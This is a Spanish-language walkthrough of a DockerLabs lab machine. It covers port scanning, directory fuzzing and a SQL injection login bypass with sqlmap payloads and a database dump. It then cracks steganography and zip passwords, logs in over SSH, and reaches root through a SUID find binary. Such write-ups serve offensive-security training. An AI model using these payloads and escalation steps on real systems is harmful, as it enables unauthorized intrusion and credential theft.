Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #sqli #password-cracking #esteganografia #dockerlabs

![](../assets/Pasted%20image%2020251109234535.png)
## Reconocimiento

Comenzamos tirando un ping para comprobar conectividad:
```bash
> ping -c 1 172.17.0.2

PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=1.43 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.426/1.426/1.426/0.000 ms
```

- El ttl indica que estamos ante un linux

Ahora procedemos a hacer un escaneo con nmap para ver que puertos están abiertos.
```bash
> nmap -p- --open --min-rate 5000 -Pn -n 172.17.0.2
----------------------------------------------------
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: DA:B4:F0:8E:E7:3E (Unknown)
```

- Vemos el puerto 80 HTTP y 22 SSH abiertos.

Ahora procedemos a hacer un segundo escaneo mas profundo sobre los puertos abiertos para detectar versiones y servicios que estan corriendo.
```bash
> nmap -p 22,80 -sS -Pn -n --min-rate 5000 -sCV 172.17.0.2 -oN target.txt
-------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:ea:4a:d7:b4:c3:d4:e2:65:29:6c:12:c4:58:c9:49 (ECDSA)
|_  256 a7:a4:a4:2e:3b:c6:0a:e4:ec:bd:46:84:68:02:5d:30 (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-title: Login Page
|_http-server-header: Apache/2.4.61 (Debian)
MAC Address: DA:B4:F0:8E:E7:3E (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH: OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
- Puerto 80 HTTP: Apache httpd 2.4.61 ((Debian))

## Enumeración

**Puerto 80 HTTP**

- Al parecer es un simple login
![](../assets/Pasted%20image%2020251109194933.png)

Viendo el codigo fuente noto que existe un script llamado `auth.php` que supongo que controla el login.
```php
 <form action="auth.php" method="post">
            <label for="username">Usuario:</label>
            <input type="text" id="username" name="username" required>
            
            <label for="password">Contraseña:</label>
            <input type="password" id="password" name="password" required>
            
            <input type="submit" value="Entrar">
  </form>
```

Ahora procedo a realizar Fuzzing para tener mas en claro todos los recursos de la web:
```bash
> gobuster dir -w raft-large-directories.txt -u http://172.17.0.2/ -x html,php,py,js,txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/page.php             (Status: 200) [Size: 2169]
/index.php            (Status: 200) [Size: 2351]
/auth.php             (Status: 200) [Size: 1852]
/server-status        (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 2351]
```

- _index.php_ hace referencia al login
- _auth.php_ es el script que controla el login

Por ultimo el _page.php_.

- Al parecer simplemente sirve para consultar la temperatura
![](../assets/Pasted%20image%2020251109195426.png)


## Explotación

El Formulario de Login, puede ser bypasseado con un simple SQLi 
```sql
1' or 1=1-- -
```

- Al bypassear el login, nos lleva a _page.php_

Sabiendo que el formulario era vulnerable a SQLi lo primero que hice fue comprobarlo con sqlmap:
```bash
> sqlmap -u "http://172.17.0.2/index.php" --forms --batch
-----------------------------------------------------------
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: username=NVJA' OR NOT 8202=8202#&password=ouXU

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=NVJA' AND (SELECT 8527 FROM(SELECT COUNT(*),CONCAT(0x7176767a71,(SELECT (ELT(8527=8527,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Pvzg&password=ouXU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=NVJA' AND (SELECT 5085 FROM (SELECT(SLEEP(5)))loap)-- USWr&password=ouXU
```

- vulnerable a una sqli error-based

Ahora procedí a listar las bases de datos:
```bash
> sqlmap -u "http://172.17.0.2/index.php" --forms --dbs --batch
-----------------------------------------------------------------
[*] information_schema
[*] users
```

- Lo que nos interesa es la base de datos _users_

Procedo a listar sus tablas:
```bash
> sqlmap -u "http://172.17.0.2/index.php" --forms -D users --tables --batch
----------------------------------------------------------------------------
Database: users
[1 table]
+----------+
| usuarios |
+----------+
```

Y ahora sabiendo que existe una tabla llamado usuarios procedo a dumpear el contenido
```bash
> sqlmap -u "http://172.17.0.2/index.php" --forms -D users -T usuarios --dump --batch
Table: usuarios
[4 entries]
+----+------------------------+------------+
| id | password               | username   |
+----+------------------------+------------+
| 1  | chocolateadministrador | admin      |
| 2  | lucas                  | lucas      |
| 3  | soyagustin123          | agustin    |
| 4  | directoriotravieso     | directorio |
+----+------------------------+------------+
```

Puede que alguna de estas credenciales nos sirva para conectarnos por SSH, por lo cual trate de conectarme con cada uno de ellos pero no tuve éxito.

En las credenciales obtenidas me di cuenta que había un password llamada directoriotravieso, por lo cual me decidí a ver si en verdad era un directorio.

- Al parecer si era un directorio que aloja una imagen llamada _miramebien.jpg_

![](../assets/Pasted%20image%2020251109202221.png)

Ahora que tengo una imagen, se me ocurrían 2 cosas:
- Metadatos - Al analizar por metadatos con exiftool, no encontré nada relevante.
- Esteganografía

Ya que la primer opción no dio resultados me dio por intentar la segunda opción. Lo primero que intente fue ver si no requería de contraseña o si la contraseña era alguna de las contraseñas que había en mysql pero no tuve éxito.
```bash
> steghide --extract -sf miramebien.jpg
```

Por lo cual decidí crackear la contraseña con `stegseek`

```bash
> stegseek miramebien.jpg /usr/share/wordlists/rockyou.txt
-------------------------------------------------------------
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "chocolate"
[i] Original filename: "ocultito.zip".
[i] Extracting to "miramebien.jpg.out".
```

- Crackeamos la contraseña con exito y me extrajo un archivo llamado miramebien.jpg.out que renombre a _ocultito.zip_

Liste el contenido del zip:
```bash
> unzip -l ocultito.zip
Archive:  ocultito.zip
16  2024-08-10 13:43   secret.txt
```

Trate de extraer el zip pero me pedía contraseña por lo cual procedí a crackearla.
```bash
> fcrackzip -u ocultito.zip -D -p /usr/share/wordlists/rockyou.txt
PASSWORD FOUND!!!!: pw == stupid1
```

Ahora que ya tengo la contraseña puedo extraer el zip y ver el contenido del _secret.txt_
```bash
> cat secret.txt
carlos:carlitos
```

- Posibles credenciales SSH.

Intento conectarme mediante SSH con esas credenciales y tengo éxito:
```bash
> ssh carlos@172.17.0.2
carlos@9533d1fb3eb7:~$ whoami
carlos
carlos@9533d1fb3eb7:~$ id                                                                                                                                        
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos),100(users)
```

## Escalada de Privilegios


Lo primero que hago dentro del sistema es ver que binarios puedo ejecutar como root o algún otro usuarios:
```bash
> sudo -l
```

- Pero no tengo éxito ya que no tengo permisos

Mi segundo approach fue buscar binarios con permisos SUID

- Aquí es donde encuentro el binario _find_ que me va a servir para escalar privilegios.

```bash
> carlos@9533d1fb3eb7:~$ find / -perm -4000 2>/dev/null 
-------------------------------------------------------
/usr/bin/find
```

Con ayuda de GTFObins exploto el binario _find_

```bash
> carlos@9533d1fb3eb7:~$ /usr/bin/find . -exec /bin/sh -p \; -quit              
# whoami
root
# id
uid=1000(carlos) gid=1000(carlos) euid=0(root) groups=1000(carlos),100(users)
```

***PWNED**
